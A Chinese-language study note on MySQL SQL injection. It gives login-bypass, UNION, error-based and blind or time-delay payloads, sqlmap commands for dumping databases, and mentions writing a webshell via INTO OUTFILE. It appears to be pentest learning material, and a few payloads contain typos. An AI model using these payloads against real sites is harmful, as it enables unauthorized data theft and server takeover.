---
title: SQL Injection
description: sql注入
---

# SQL Injection

## SQL Injection

**程序员在编写代码的时候，没有对用户输入数据的合法性进行判断，使应用程序存在安全隐患。**

## MYSQL注入常用函数

| 函数                              | 功能                                           |
| :-------------------------------- | :--------------------------------------------- |
| Order by                          | 按指定列排序，可判断查询结果列数               |
| User()                            | 当前用户名                                     |
| current_user()                    | 当前用户（可查权限）                           |
| database()                        | 当前所使用的数据库                             |
| @@datadir                         | 数据库的路径                                   |
| Version() / @@version             | 数据库的版本                                   |
| @@version_compile_os              | 查看操作系统版本                               |
| concat(str1,str2)                 | 连接n个字符                                    |
| concat_ws(separator,str1,str2)    | 用分隔符连接两个字段的字符串                   |
| group_concat(str1,str2)           | 将多行查询的结果用逗号分隔全部输出             |
| substr(string, start,length)      | 将目标字符串从strat位置截取指定长度length      |
| limit                             | 返回结果中指定的数据                           |
| COUNT（column_name）              | 返回指定列的值数目                             |
| sleep（num）                      | 让语句暂停num秒的时间                          |
| if（condition，result1，result2） | 判断一个条件，条件为真执行结果1，否则执行结果2 |
| load_file()                       | 读文件                                         |
| into outfile（）/ into dumpfile   | 写文件                                         |





## SQL注入中的注释符

**注释符用于将注入点原有的sql语句后半段注释掉，以保证sql语句正常执行。**

* 单行注释 **#**
* 多行注释 **/**/**
* 单行注释 **-- （后面必须要空格**）

#### 内联注释

**内联注释是MYSQL数据库为了保持与其他数据库兼容，特意新添加的功能。**

为了避免从MYSQL中导出的SQL语句不能被其他数据库使用，他把一些MYSQL特有的语句放在 /**\! ...*\*/,这些语句在不兼容MYSQL数据库中使用时不会执行，而MYSQL数据库可以识别、执行。

**在SQL注入中，内联注释常用来绕过waf。**

## SQL Injection 流程

#### 寻找注入点

**当然是与数据库有交互的地方**

**例子：**

* 表单中的输入参数

* URL中的参数

* Cookie或header头中其他的参数

  **用户信息、排名公布、文章展示、评论、搜索框、登陆框、cookie（session持久化需要存储在数据库**

  **中）**



#### 测试注入点 && 判断闭合符号

**常用闭合符号**：

* 单引号 '
* 双引号"
* 无符号（直接拼接）
* 圆括号（）

**根据报错信息判断闭合符号**

值得注意的是报错信息打印信息有可能有加上‘ ’



#### 万能密码原理

**正常后台的sql语句：**

```php
$sql = select * from users where username = '$username'  and  password = '$password' limit 0,1; 
```

* **Username = admin'or1#**

 ```php
$sql = select * from users where username = 'admin' or 1 #  and  password = '$password' limit 0,1; 
 ```

* **如果admin真的存在 password = 123'or1#**

```php
$sql = select * from users where username = 'admin' or 1
$sql = select * from users where username = 'admin'  and  password = '123' or 1; 
```

  

#### 注入语句

**找到注入点以后，我们就可以执行相应的sql语句，来获取数据库中的信息**



## UNION 联合查询注入

**联合查询是使用 union 或者 union all 拼接两条 select 语句来查询注入方式**


> 注释：默认地，UNION 操作符选取不同的值。如果允许重复的值，请使用 UNION ALL。

```sql
select * from users union all select user(),database(),version();
```

#### **order by 语句**

> 要注意的是联合查询前后两条 select 语句查询数据的列数是相等的，故需要使用 order by 语句来判断注入点sql语句查询的列数是多少
>
> order by 排序超过查询结果列数的时候就会抛出错误，故可以使用它来判断前一条 select 语句查询结果的列数

#### **查询数据库内容常用的语句**

> table_name列：记录当前数据库管理系统下表的合集
>  table_schema列：记录当前数据库管理系统下数据库名的合集
>  column_name列：记录当前数据库管理系统下的所有列的合集

```sql
* "爆库" ： select group_concat(schema_name) from information_schema.schemata;
* "爆表1"： select group_concat(table_name) from information_schema.tables where table_schema = 'xxx';
information_schema,mysql,performance_schema,sqli 
* "爆表2"： select  table_name from information_schema.tables where table_schema = 'xxx' limit 1,1; (有时候waf会把group_concat()屏蔽掉)
* "爆字段1": select group_concat (column_name) from information_schema.columns where table_name = 'xxx' and table_schema = 'xxx';
* "爆字段2": select column_name from information_schema.columns where tables_name 'users' and table_schema = 'xxxx' limit 1,1;(同理)
* "爆数据值": select group_concat(xxx,0x3a(冒号),xxx) from xxx.xxx;

```

## 报错注入

MYSQL 中有一些函数在报错的时候会抛出错误的代码，借此执行一些特定的SQL语句来获取数据库的信息。

**在有些时候虽然也存在注入点也能够执行SQL语句，但是页面并没有打印sql执行的结果的回显的位置，但是如果抛出错误代码就可以利用报错回显，来查看注入SQL语句的执行的结果。**

#### 报错注入的常用函数

> updatexml(xml_doument,XPath_string,new_value)
> 第一个参数：XML的内容
> 第二个参数：是需要update的位置XPATH路径
> 第三个参数：是更新后的内容
> 所以第一和第三个参数可以随便写，只需要利用第二个参数，他会校验你输入的内容是否符合XPATH格式,是用/xxx/xxx/xxx/....这种格式，以～开头的内容肯定不是xml格式的语法
>
> 该函数最大显示长度为32，超过长度可以配合substr、limit等函数；来显示（extractvalue 类似

* substr从1开始 每次需增加31才能刚好到32

>Floor()
>
>floor()报错注入的原因是**group by**在向临时表插入数据**时，由于**rand()**多次计算导致插入临时表时主键**重复**，从而报错，又因为报错前**concat()**中的**SQL**语句或函数被执行**，所以该语句报错且被抛出的主键是SQL语句或函数执行后的结果
>
>该函数最大显示长度为64，超过长度可以配合substr、limit等函数来显示

```sql
* "updatexml() ": select * from test where id = 1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1)); 
* "floor()": select * from test where id =1 and (select 1 from (select  count(*),concat((select user()),floor(rand(0)*2)) x from information_schema.tables group by x) a );
* "extractvalue": select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));
# 等等
```

## 布尔盲注

**布尔盲注一般适用于页面没有回显字段不支持联合查询和报错注入，且web页面返回True 或者 false，**

构造SQL语句，利用and，or等关键字来其后的语句 true 或 false 使web页面返回 true 或 false，从而达到注入的目的来获取信息

#### 查询数据内容

由于没有回显，只能利用一些函数构造等式、判断数据内容

length（）返回一个字符串的长度，可以判断字符串sql查询结果的长度

```sql
"判断当前数据库的名字的长度"
and length(database())=8 -- +
"使用指定字符一位一位判断截取到的字符"
and substr(database(),1,1)='a' -- +
"截取制定长度，进行判断"
and left(database(),8)='xxxxxxxx'
"可使用ascii函数，查询截取到字符的ascii码"
and (substr((database()),1,1))=xxx -- +
```

## 延时注入

**延时注入是盲注的一种，在页面没有回显和报错，也不能通过拼接 and 0 、and 1 的布尔表达式来判断sql语句是否成功执行，只能在参数后and sleep(5) ， 加上延时函数sleep()， 如果sql语句执行页面刷新就会有一定的延时，根据页面是否有延时来判断sql语句执行与否所以叫做延时注入**

#### 查询数据内容

**由于没有回显，我们只能利用一些函数来构造等式，判断数据内容**

**length() 函数返回一个字符串的长度，可以以用来判断字符串 sql 查询结果的长度**

```php
"判断当前数据库的名字的长度"
 and if(length(database)=8,sleep(3),1) -- +
  "使用指定字符一位一位判断截取到的字符"
and if(substr(database(),1,1)='x',sleep(3),1) -- +
   "截取制定长度，进行判断"
  and if(left(length(database()),8)='xxxxxx',sleep(3),1) -- +
    "可使用ascii函数，查询截取到字符的ascii码"
    and if(ascii(substr(databse(),1,1))=xxx,sleep(3),1)
```



## SQLMAP 自动化注入工具

**sqlmap 是一个开源渗透测试工具，它可以自动检测和利用 SQL 注入漏洞并接管数据库服务器。它具有强大的检测引擎，同时有众多功能，包括数据库指纹识别、从数据库中获取数据、访问底层文件系统以及在操作系统上带内连接执行命令**

#### 基本参数

| 参数            | 含义                                                         |
| --------------- | ------------------------------------------------------------ |
| -h              | 查看帮助手册                                                 |
| -u              | 指定URL地址                                                  |
| --dbs           | 列出所有数据库                                               |
| -cerrent-db     | 列出当前数据库                                               |
| -D              | 指定一个数据库                                               |
| --tables        | 列出所有表名                                                 |
| -T              | 指定一个表                                                   |
| -C              | 指定某一些字段                                               |
| --columns       | 列出所有字段名                                               |
| --dump          | 获取数据内容                                                 |
| -p              | 标记注入点（指定注入参数）                                   |
| --data          | 指定post参数eg：--data"userid=aaa&passwd=bbbb"               |
| -r              | 读取文件内容作为监测数据，进行注入检测eg：-r 1.txt           |
| --level         | 设置测试等级（1-5，默认1）lv2:cookie；lv3:user-agent，refere；lv5:host |
| --risk          | 升高风险等级会增加数据被篡改的风险。risk 2：基于事件的测试;risk 3：or语句的测试;risk 4 |
| -- random-agent | 随机ua进行测试                                               |
| --cookie        | 指定cookie进行请求测试                                       |
| --os-shell      | 获取交互式进行请求测试                                       |
| --dbms          | 指定数据库类型eg：--dbms=musql                               |
| --os            | 指定目标操作系统eg：--os=windows                             |
| --threads       | 设置线程1-10，默认1                                          |
| --skip          | \# 排除指定的参数                                            |
| --current-user  | 获取当前用户名                                               |
| --privileges    | 查看特权，常用。例： --privileges -U username (CU 就是当前用户) |
| --sql-shell     | 创建一个sql的交互式shell                                     |



#### sqlmap基本使用

1.检测注入点

检测是否存在sql注入漏洞，注意get型注入提交的url中要有含义参数

> python sqlmap.py -u 网址 (如果有多个参数点要加“ ”)

2.爆库

> 获取当前库名
>
> python sqlmap.py -u 网址 --current-db
>
> 获取所有库名
>
> python sqlmap.py -u 网址 --dbs

3.爆表

> python sqlmap.py -u 网址 -D security --tables

4.爆字段

> python sqlmap.py -u 网址 -D security -T users --cloums

5.爆数据

> python sqlmap.py -u 网址 -D 数据库 -T 数据表 --dump
>
> 获取指定字段数据内容
>
> python sqlmap.py -u 网址 -D 数据库 -T 数据表 -C 字段,字段 --dump

#### SQLMAP参数详解

https://app.yinxiang.com/fx/a2dd7f1f-f40a-4315-be93-7c4124073e67



## POST注入

**post注入就是参数以post形式提交且提交的参数与数据库有交互**

> 一般来说post表单 sql语句是这样：
>
> $sql = "select username,password from users where username = '$uname' and password = '$password' limit 0,1"

* 在登陆窗口判断闭合符和测试注入点的时候如果抛出错误

  **四种注入方式应该都可以**

* 在**登陆到用户后台修改密码**判断闭合符和测试注入点的时候如果抛出错误

  > 更新数据 sql语句是这样：
  >
  > update users set password='xxxx' where username='xxxx';
  >
  > 切记不能在password 后面加上注释符，
  >
  > update users set password='123456'#' where username='admin';

  **为避免这种情况，在真实的环境中导致数据库全部被篡改，在update注入时应慎用注释符，改为 and '1'='1 或or '1'='1 来构建闭合，同时也应慎用 sqlmap工具检测**

## header头注入

http请求头 header 中可能会存在一些与数据库有交互的数据，例如session持久化需要使用数据库，一些日志系统可能会记录用户访问的ua、referer等信息存放到数据库中，此时就有可能出现sql注入的风险。

* **referer类型一般是insert语句**

> $insert = "insert into \`xxx(数据库)\` .\`referers\` (\`referers\`,\`xxx(比如说ip等\`)) values('$uagent','$IP')

**如果注入大量的无效语句在比较重要的表中，在真实的环境中导致数据库效率变低，在insert注入时应慎用，同时也应慎用 sqlmap工具检测**



## cookie注入

**burp抓包分析，发现cookie中有数据，可能与数据库有交互有待进一步测试**

## 文件读写注入

**当目标站点存在sql注入漏洞时，在一定条件下不仅可以读取数据库中的数据，还可以通过mysql导出文件的功能，向目标站点中写入木马，达到控制整个网站的目的**

> mysql读写文件相关函数
>
> load_file()  # 读取文件
>
> into outfile() / into dumpfile  # 写入文件

#### mysql权限问题

**在使用执行 LOAD DATA 、 SELECT … INTO OUTFILE 语句和 LOAD_FILE() 函数，这些操作需要用户具有 FILE权限**



![mysql权限](/Users/zhangwenge/Documents/MarkDown/go_super/go photo/mysql权限.png)

#### secure_file_priv问题

**mysql.ini 文件中 secure_file_priv 为null表示不允许导出文件到任何位置， secure_file_priv= 为空表示可以往任意位置导出文件， secure_file_priv=D:\phpstudy_pro\WWW 表示只允D:\phpstudy_pro\WWW 目录导出文件**

> \# 查看导出路径配置
>
> show variables like ‘%secure_file_priv%’;

